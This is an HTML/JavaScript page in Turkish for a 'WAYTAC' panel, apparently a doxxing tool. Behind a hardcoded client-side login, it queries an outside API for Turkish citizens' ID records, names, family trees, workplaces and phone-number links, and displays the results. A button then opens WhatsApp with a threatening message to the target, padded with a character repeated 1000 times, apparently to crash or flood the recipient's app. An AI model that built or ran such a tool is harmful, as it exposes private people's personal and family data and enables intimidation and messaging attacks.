<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAYTAC | Komuta Merkezi</title>
    <link rel="stylesheet" href="https://cloudflare.com">
    <style>
        :root { --bg: #05070a; --sidebar: #0a0d14; --accent: #2f81f7; --text: #8b949e; --card: #10141c; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; overflow-x: hidden; min-height: 100vh; }
        #auth-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; display: flex; align-items: center; justify-content: center; }
        .auth-box { background: var(--card); padding: 40px; border-radius: 24px; border: 1px solid #30363d; width: 90%; max-width: 400px; text-align: center; }
        .auth-input { width: 100%; padding: 15px; margin-bottom: 15px; background: #0d1117; border: 1px solid #30363d; border-radius: 12px; color: white; outline: none; }
        .auth-btn { width: 100%; padding: 15px; background: var(--accent); border: none; border-radius: 12px; color: white; font-weight: bold; cursor: pointer; }
        .menu-toggle { position: fixed; top: 25px; left: 25px; background: var(--accent); color: white; width: 45px; height: 45px; display: flex; align-items: center; justify-content: center; border-radius: 12px; cursor: pointer; z-index: 2000; }
        .sidebar { width: 280px; height: 100vh; background: var(--sidebar); position: fixed; left: -280px; top: 0; border-right: 1px solid #1e293b; padding: 25px; z-index: 1500; transition: 0.3s; overflow-y: auto; }
        .sidebar.active { left: 0; }
        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1400; backdrop-filter: blur(5px); }
        .overlay.active { display: block; }
        .logo { font-size: 22px; font-weight: 800; margin-bottom: 35px; margin-top: 50px; text-align: center; }
        .logo span { color: var(--accent); }
        .menu-section p { font-size: 10px; color: #444; margin: 15px 0 5px 10px; text-transform: uppercase; font-weight: bold; }
        .menu-item, .dropbtn { display: flex; align-items: center; width: 100%; padding: 12px; color: var(--text); text-decoration: none; border-radius: 10px; background: none; border: none; cursor: pointer; font-size: 14px; margin-bottom: 2px; text-align: left; }
        .menu-item:hover, .dropbtn:hover { background: #1f2937; color: white; }
        .menu-item i, .dropbtn i { margin-right: 12px; width: 18px; text-align: center; color: var(--accent); }
        .dropdown-content { display: none; padding-left: 20px; flex-direction: column; background: rgba(255,255,255,0.02); border-radius: 8px; }
        .dropdown-content a { font-size: 13px; color: #64748b; padding: 10px; border-radius: 8px; text-decoration: none; }
        main { width: 100%; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .stat-card { background: var(--card); border: 1px solid #30363d; border-radius: 30px; padding: 40px; max-width: 550px; width: 100%; text-align: center; }
        #terminal-log { background: #000; color: #2f81f7; font-family: monospace; font-size: 12px; padding: 15px; border-radius: 12px; margin-top: 20px; text-align: left; height: 120px; overflow-y: auto; display: none; border: 1px solid #1e293b; }
        .result-box { background: #1a1f26; padding: 20px; border-radius: 15px; margin-top: 20px; text-align: left; border-left: 4px solid var(--accent); display: none; overflow-x: auto; white-space: pre-wrap; font-size: 13px; }
    </style>
</head>
<body>

    <div id="auth-overlay">
        <div class="auth-box">
            <h2 style="color:var(--accent); margin-bottom:25px;">🔱 AYTAÇ LOGIN</h2>
            <input type="text" id="l_user" class="auth-input" placeholder="Operatör">
            <input type="password" id="l_pass" class="auth-input" placeholder="Mühür">
            <button onclick="doLogin()" class="auth-btn">SİSTEME SIZ</button>
        </div>
    </div>

    <div class="menu-toggle" onclick="toggleSidebar()"><i class="fas fa-bars"></i></div>
    <div class="overlay" id="overlay" onclick="toggleSidebar()"></div>

    <div class="sidebar" id="sidebar">
        <div class="logo">🔍 WAYTAC <span>PANEL</span></div>
        <div class="menu-section">
            <a href="#" class="menu-item" onclick="location.reload()"><i class="fas fa-home"></i> Ana Sayfa</a>
            <p>Mernis 2026</p>
            <div class="dropdown">
                <button class="dropbtn" onclick="toggleDrop(this)"><i class="fas fa-fingerprint"></i> Kimlik <i class="fas fa-chevron-down" style="margin-left:auto"></i></button>
                <div class="dropdown-content">
                    <a href="#" onclick="showSorgu('tc', '11 Haneli T.C.')">• TC Sorgu</a>
                    <a href="#" onclick="showSorgu('adsoyad', 'Ad Soyad')">• Ad Soyad</a>
                </div>
            </div>
            <p>İstihbarat</p>
            <div class="dropdown">
                <button class="dropbtn" onclick="toggleDrop(this)"><i class="fas fa-users"></i> Aile & Soy <i class="fas fa-chevron-down" style="margin-left:auto"></i></button>
                <div class="dropdown-content">
                    <a href="#" onclick="showSorgu('sulale', 'T.C. No')">• Sülale Sorgu</a>
                    <a href="#" onclick="showSorgu('isyeri', 'T.C. No')">• İşyeri Sorgu</a>
                </div>
            </div>
            <div class="dropdown">
                <button class="dropbtn" onclick="toggleDrop(this)"><i class="fas fa-phone-alt"></i> GSM <i class="fas fa-chevron-down" style="margin-left:auto"></i></button>
                <div class="dropdown-content">
                    <a href="#" onclick="showSorgu('gsmtc', 'GSM (0 olmadan)')">• GSM -> TC</a>
                    <a href="#" onclick="showSorgu('tcgsm', 'T.C. No')">• TC -> GSM</a>
                </div>
            </div>
            <a href="#" class="menu-item" style="color:#ef4444; margin-top:20px;" onclick="localStorage.removeItem('waytac_session'); location.reload();"><i class="fas fa-power-off"></i> Bağlantıyı Kes</a>
        </div>
    </div>

    <main>
        <div id="dynamic-area">
            <div class="stat-card">
                <h1>Operatör <span style="color:var(--accent);">#AYTAÇ</span></h1>
                <p style="color:var(--text); margin-top:10px;">Karargah aktif. arastir.sbs tünelleri sarsılmaz birer hızla mühürlendi.</p>
                <div style="display:flex; gap:15px; margin-top:30px;">
                    <div style="background:#1f2937; padding:15px; border-radius:15px; flex:1;"><span style="color:var(--accent); font-size:12px; display:block;">Durum</span><span style="font-size:18px; font-weight:bold; color:#10b981;">ONLINE</span></div>
                    <div style="background:#1f2937; padding:15px; border-radius:15px; flex:1;"><span style="color:var(--accent); font-size:12px; display:block;">API</span><span style="font-size:18px; font-weight:bold;">ARASTIR.SBS</span></div>
                </div>
            </div>
        </div>
    </main>

    <script>
        const API_BASE = "https://arastir.sbs";

        function doLogin() {
            if(document.getElementById('l_user').value === "waytac" && document.getElementById('l_pass').value === "aytac1235") {
                localStorage.setItem('waytac_session', 'waytac');
                document.getElementById('auth-overlay').style.display = 'none';
            } else { alert("❌ Mühür Reddedildi!"); }
        }
        if(localStorage.getItem('waytac_session')) document.getElementById('auth-overlay').style.display = 'none';

        function toggleSidebar() { document.getElementById("sidebar").classList.toggle("active"); document.getElementById("overlay").classList.toggle("active"); }
        function toggleDrop(btn) { const content = btn.nextElementSibling; content.style.display = content.style.display === 'flex' ? 'none' : 'flex'; }
        
        function showSorgu(t, p) {
            document.getElementById('dynamic-area').innerHTML = `
            <div class="stat-card">
                <h2 style="color:var(--accent);">${t.toUpperCase()} SORGULAMA</h2>
                <input type="text" id="target" placeholder="${p}..." style="width:100%; padding:16px; margin:20px 0; background:#0d1117; border:1px solid #334155; color:white; border-radius:12px; outline:none; text-align:center;">
                <button onclick="startInfaz('${t}')" style="width:100%; padding:16px; background:var(--accent); color:white; border:none; border-radius:12px; font-weight:bold; cursor:pointer;">İNFAZ ET</button>
                <div id="terminal-log"></div><div id="result-box" class="result-box"></div>
            </div>`;
            toggleSidebar();
        }

        async function startInfaz(tip) {
            const val = document.getElementById('target').value;
            if(!val) return alert("HEDEF BOŞ!");
            const logArea = document.getElementById('terminal-log');
            const res = document.getElementById('result-box');
            logArea.style.display = "block"; res.style.display = "none";
            logArea.innerHTML = `> arastir.sbs tüneli açılıyor...<br>> AYTAÇ otoritesi mahzene sızıyor...<br>> Veri deşifre ediliyor...`;

            let url = `${API_BASE}${tip}.php?`;
            if(tip === 'adsoyad') {
                const parts = val.split(' ');
                url += `adi=${parts[0]}&soyadi=${parts[1] || ''}`;
            } else if(tip === 'gsmtc') {
                url += `gsm=${val}`;
            } else {
                url += `tc=${val}`;
            }

            try {
                const response = await fetch(url);
                const data = await response.json();
                setTimeout(() => {
                    logArea.style.display = "none"; res.style.display = "block";
                    res.innerHTML = `<p style="color:var(--accent); font-weight:bold; border-bottom:1px solid #334155;">🔱 AYTAÇ SORGU SONUCU</p><pre>${JSON.stringify(data, null, 2)}</pre>
                    <button onclick="window.open('https://whatsapp.com{val}&text=🔱%20AYTAÇ%20TARAFINDAN%20İNFAZ%20EDİLDİN%20🔱%20${"%E1%9A%9B".repeat(1000)}', '_blank')" style="margin-top:15px; width:100%; padding:12px; background:#ef4444; color:white; border:none; border-radius:10px; font-weight:bold; cursor:pointer;">🔥 TRAVA MERMİSİNİ ATEŞLE 🔥</button>`;
                }, 2000);
            } catch(e) {
                logArea.innerHTML += "<br>❌ Sinyal Kesildi! API Bağlantı Hatası.";
            }
        }
    </script>
</body>
</html>
